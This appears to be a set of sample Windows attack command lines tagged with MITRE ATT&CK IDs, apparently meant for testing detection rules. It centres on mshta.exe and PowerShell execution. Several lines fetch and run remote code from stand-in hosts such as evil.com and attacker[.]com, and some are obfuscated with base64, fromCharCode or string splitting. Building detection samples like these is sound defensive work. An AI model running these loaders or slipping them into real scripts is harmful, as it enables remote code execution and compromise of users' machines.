### T1059.007 — JavaScript (fileless, network loader style)
```scss
mshta.exe "javascript:var r=new ActiveXObject('MSXML2.XMLHTTP');r.open('GET','https://static-example[.]net/assets/app.js',0);r.send();if(r.status==200){new Function(r.responseText)();}"
```

### T1059.005 — Visual Basic (inline VBScript)
```scss
mshta.exe "vbscript:Execute(CreateObject(""WScript.Shell"").Run(""cmd.exe /c whoami"",0))"
```

### T1059.003 — Windows Command Shell (LOLBin chain)
```scss
cmd.exe /c mshta.exe "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('cmd.exe /c dir C:\\Users',0)"
```

### T1059.001 — PowerShell (launched indirectly)
```scss
mshta.exe "javascript:var sh=new ActiveXObject('WScript.Shell');sh.Run('powershell -nop -c Get-Process',0)"
```

### T1059.007 + T1027 — JavaScript with light obfuscation
```scss
mshta.exe "javascript:var p='po'+'wer'+'shell';var w=new ActiveXObject('WScript.Shell');w.Run(p+' -c echo test',0)"
```

### T1059.005 — VBScript + ActiveX download pattern (classic)
```scss
mshta.exe "vbscript:Set x=CreateObject(""MSXML2.XMLHTTP""):x.Open ""GET"",""https://api-example[.]org/data"",False:x.Send"
```

### Mixed-signal "analyst headache" sample (very realistic)

#### Multiple techniques, mshta + JavaScript + ActiveX + cmd.exe chain
```scss
powershell.exe -c mshta.exe "javascript:try{var a=new ActiveXObject('MSXML2.XMLHTTP');a.open('GET','https://cdn-example[.]com/r',0);a.send();if(a.status==200){Function(a.responseText)();}}catch(e){}"
```

#### Direct WScript.Shell.Run to cmd.exe (from your improvements)
```scss
mshta.exe javascript:var s=new ActiveXObject('WScript.Shell');s.Run('cmd.exe /c whoami',0)
```

#### Light obfuscation - String concatenation
```scss
mshta.exe "javascript:var p='cmd''.exe';var w=new ActiveXObject('WScript.Shell');w.Run(p+' /c calc',0)"
```

#### Heavy obfuscation - Base64 encoded PowerShell
```scss
powershell.exe -encodedCommand JABzAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAHMALgBkAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAoACIAaAB0AHQAcAA6AC8ALwBhAHQAdABhAGMAawBlAHIALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAiACwAIgBjADoAXAB0AGUAbQBwAFwAcAAuAGUAeABlACIAKQA=
```

#### Heavy obfuscation - JavaScript fromCharCode encoding
```scss
mshta.exe "javascript:eval(String.fromCharCode(118,97,114,32,115,61,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,39,87,83,99,114,105,112,116,46,83,104,101,108,108,39,41,59,115,46,82,117,110,40,39,99,109,100,46,101,120,101,32,47,99,32,119,104,111,97,109,105,39,44,48,41))"
```

#### Heavy obfuscation - JavaScript atob() (base64)
```scss
mshta.exe "javascript:eval(atob('dmFyIHM9bmV3IEFjdGl2ZVhPYmplY3QoJ1dTY3JpcHQuU2hlbGwnKTtzLlJ1bignY21kLmV4ZSAvYyB3aG9hbWknLDApOw=='))"
```

#### Extreme obfuscation - Multiple layers (PowerShell + base64 + fromCharCode)
```scss
powershell.exe -nop -w hidden -c "IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://evil.com/stage1'))))"
```

#### VBScript via mshta with Execute and command chaining
```scss
mshta.exe "vbscript:Execute(CreateObject('WScript.Shell').Run('cmd.exe /c powershell -nop -c Get-ProcessList',0))"
```

#### Remote code download + local execution via mshta JavaScript
```scss
mshta.exe "javascript:var xhr=new ActiveXObject('MSXML2.XMLHTTP');xhr.open('GET','https://attacker[.]com/stager.ps1',0);xhr.send();new Function(xhr.responseText)()"
```

#### Multi-layer staging: PowerShell → mshta → vbscript → cmd
```scss
powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString('https://stager.com/p1.ps1'); Start-Process mshta.exe -ArgumentList 'vbscript:Set o=CreateObject(\"WScript.Shell\"):o.Run(\"cmd.exe /c powershell -ep bypass -c iex(gci env:PSCommandPath).Value\",0)'"
```